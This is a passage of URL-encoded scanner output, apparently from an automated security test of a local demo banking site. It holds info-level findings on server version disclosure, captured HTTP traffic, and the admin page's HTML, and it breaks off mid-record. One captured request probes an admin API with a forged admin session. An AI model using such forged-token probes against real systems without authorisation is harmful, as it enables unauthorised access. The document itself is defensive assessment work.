C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2013%3A19%3A47%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%2C%7B%5C%22id%5C%22%3A3%2C%5C%22from_account_id%5C%22%3A2%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22to_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%22200.00%5C%22%2C%5C%22description%5C%22%3A%5C%22Weekend%20spending%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22own%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-02-01%2010%3A00%3A00%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%2C%7B%5C%22id%5C%22%3A1%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22to_account_id%5C%22%3A2%2C%5C%22amount%5C%22%3A%5C%22500.00%5C%22%2C%5C%22description%5C%22%3A%5C%22Monthly%20savings%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22own%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-01-05%2009%3A12%3A00%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A1%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A3%2C%5C%22total_pages%5C%22%3A1%7D%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Server%20and%20runtime%20versions%20are%20disclosed%22%2C%22description%22%3A%22Response%20headers%20expose%20exact%20Apache%20and%20PHP%20versions.%22%2C%22impact%22%3A%22An%20attacker%20can%20use%20the%20version%20information%20to%20identify%20potentially%20applicable%20component-specific%20vulnerabilities.%22%2C%22likelihood%22%3A%22The%20disclosure%20is%20directly%20observable%2C%20but%20no%20vulnerable%20component%20or%20related%20exploit%20was%20demonstrated.%22%2C%22recommendation%22%3A%22Configure%20Apache%20and%20PHP%20to%20suppress%20detailed%20version%20information%20in%20HTTP%20response%20headers.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%2F10%22%2C%22evidence%22%3A%22The%20response%20disclosed%20server%3A%20Apache%2F2.4.68%20(Unix)%20and%20x-powered-by%3A%20PHP%2F8.4.25.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%2F10%5Cnuse_session%3A%20fresh_forged_admin%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20401%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A32%3A10%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2076%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20token.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%2F10%5Cnuse_session%3A%20fresh_forged_admin%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20401%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A32%3A10%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2076%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20token.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Server%20and%20runtime%20versions%20are%20disclosed%22%2C%22description%22%3A%22The%20Server%20response%20header%20discloses%20the%20exact%20web%20server%20version%20and%20operating-system%20family.%22%2C%22impact%22%3A%22An%20attacker%20can%20use%20the%20disclosed%20version%20to%20narrow%20vulnerability%20research%20and%20tailor%20later%20probes.%22%2C%22likelihood%22%3A%22The%20information%20is%20available%20on%20every%20tested%20admin-page%20request%2C%20but%20no%20vulnerable%20Apache%20behavior%20was%20demonstrated.%22%2C%22recommendation%22%3A%22Configure%20Apache%20ServerTokens%20and%20ServerSignature%20to%20suppress%20detailed%20version%20information.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%23%2Fcustomers%2F11%22%2C%22evidence%22%3A%22The%20response%20header%20reports%20%5C%22server%3A%20Apache%2F2.4.68%20(Unix)%5C%22.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%23%2Fcustomers%2F11%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A34%3A23%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnlast-modified%3A%20Sun%2C%2023%20Aug%202026%2012%3A34%3A31%20GMT%5Cnetag%3A%20%5C%224c9c-659b6175aa3c0%5C%22%5Cnaccept-ranges%3A%20bytes%5Cncontent-length%3A%2019612%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20text%2Fhtml%5Cn%5Cn%3C!DOCTYPE%20html%3E%5Cn%3Chtml%20lang%3D%5C%22en%5C%22%3E%5Cn%3Chead%3E%5Cn%20%20%3Cmeta%20charset%3D%5C%22UTF-8%5C%22%3E%5Cn%20%20%3Cmeta%20name%3D%5C%22viewport%5C%22%20content%3D%5C%22width%3Ddevice-width%2C%20initial-scale%3D1.0%5C%22%3E%5Cn%20%20%3Ctitle%3EThe%20Bank%20of%20Ed%20-%20Admin%3C%2Ftitle%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%5C%22%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.gstatic.com%5C%22%20crossorigin%3E%5Cn%20%20%3Clink%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%2Fcss2%3Ffamily%3DInter%3Awght%40300%3B400%3B500%3B600%3B700%26display%3Dswap%5C%22%20rel%3D%5C%22stylesheet%5C%22%3E%5Cn%20%20%3Cscript%20src%3D%5C%22https%3A%2F%2Fcdn.tailwindcss.com%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%3E%5Cn%20%20%20%20tailwind.config%20%3D%20%7B%5Cn%20%20%20%20%20%20theme%3A%20%7B%5Cn%20%20%20%20%20%20%20%20extend%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20colors%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20dark%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%2050%3A%20'%23f4f4f5'%2C%20100%3A%20'%23e4e4e7'%2C%20200%3A%20'%23d4d4d8'%2C%20300%3A%20'%23a1a1aa'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20400%3A%20'%2371717a'%2C%20500%3A%20'%2352525b'%2C%20600%3A%20'%233f3f46'%2C%20700%3A%20'%2327272a'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20800%3A%20'%2318181b'%2C%20900%3A%20'%2309090b'%2C%20950%3A%20'%23030305'%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%7D%5Cn%20%20%20%20%20%20%20%20%20%20%7D%2C%5Cn%20%20%20%20%20%20%20%20%20%20fontFamily%3A%20%7B%20sans%3A%20%5B'Inter'%2C%20'system-ui'%2C%20'sans-serif'%5D%20%7D%5Cn%20%20%20%20%20%20%20%20%7D%5Cn%20%20%20%20%20%20%7D%5Cn%20%20%20%20%7D%5Cn%20%20%3C%2Fscript%3E%5Cn%20%20%3Clink%20rel%3D%5C%22stylesheet%5C%22%20href%3D%5C%22css%2Fapp.css%5C%22%3E%5Cn%3C%2Fhead%3E%5Cn%3Cbody%20class%3D%5C%22bg-dark-50%20font-sans%20text-dark-800%5C%22%3E%5Cn%5Cn%20%20%3C!--%20Toast%20Container%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22toast-container%5C%22%20class%3D%5C%22fixed%20top-4%20right-4%20z-50%20space-y-2%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Modal%20Overlay%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22modal-overlay%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-40%20bg-black%2F50%20backdrop-blur-sm%20flex%20items-center%20justify-center%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22modal-content%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20w-full%20max-w-md%20max-h-%5B90vh%5D%20overflow-y-auto%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20AUTH%20VIEW%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22view-auth%5C%22%20class%3D%5C%22hidden%20min-h-screen%20flex%20items-center%20justify-center%20bg-gradient-to-br%20from-dark-900%20via-dark-800%20to-dark-950%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22w-full%20max-w-md%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22text-center%20mb-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22inline-flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-7%20h-7%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-3xl%20font-bold%20text-white%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-400%20mt-2%5C%22%3EAdministration%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20overflow-hidden%20p-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22login-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.AuthPage.handleLogin(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22space-y-5%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EUsername%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20name%3D%5C%22username%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22admin%5C%22%20autofocus%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EPassword%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22password%5C%22%20name%3D%5C%22password%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22Enter%20password%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22login-errors%5C%22%20class%3D%5C%22mt-4%20text-sm%20text-red-600%20hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20class%3D%5C%22w-full%20mt-6%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20In%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20APP%20SHELL%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22app-shell%5C%22%20class%3D%5C%22hidden%20flex%20h-screen%20overflow-hidden%5C%22%3E%5Cn%5Cn%20%20%20%20%3C!--%20Mobile%20Header%20--%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22lg%3Ahidden%20fixed%20top-0%20left-0%20right-0%20z-30%20bg-dark-900%20text-white%20flex%20items-center%20justify-between%20px-4%20py-3%5C%22%3E%5Cn%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22p-2%20hover%3Abg-dark-800%20rounded-lg%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%206h16M4%2012h16M4%2018h16%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-8%20h-8%20bg-red-600%20rounded-lg%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cspan%20class%3D%5C%22font-semibold%5C%22%3EAdmin%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20Overlay%20(mobile)%20--%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22sidebar-overlay%5C%22%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-30%20bg-black%2F50%20lg%3Ahidden%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20--%3E%5Cn%20%20%20%20%3Caside%20id%3D%5C%22sidebar%5C%22%20class%3D%5C%22fixed%20lg%3Astatic%20inset-y-0%20left-0%20z-40%20w-64%20bg-dark-900%20text-white%20flex%20flex-col%20transform%20-translate-x-full%20lg%3Atranslate-x-0%20transition-transform%20duration-200%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-6%20flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%20h-10%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22font-bold%20text-lg%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%5C%22%3EAdmin%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cnav%20class%3D%5C%22flex-1%20px-3%20space-y-1%20mt-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20data-nav%3D%5C%22customers%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2020h5v-2a3%203%200%2000-5.356-1.857M17%2020H7m10%200v-2c0-.656-.126-1.283-.356-1.857M7%2020H2v-2a3%203%200%20015.356-1.857M7%2020v-2c0-.656.126-1.283.356-1.857m0%200a5.002%205.002%200%20019.288%200M15%207a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ECustomers%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Faccounts%5C%22%20data-nav%3D%5C%22accounts%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M3%2010h18M7%2015h1m4%200h1m-7%204h12a3%203%200%20003-3V8a3%203%200%2000-3-3H6a3%203%200%2000-3%203v8a3%203%200%20003%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EAccounts%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Ffx-rates%5C%22%20data-nav%3D%5C%22fx-rates%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C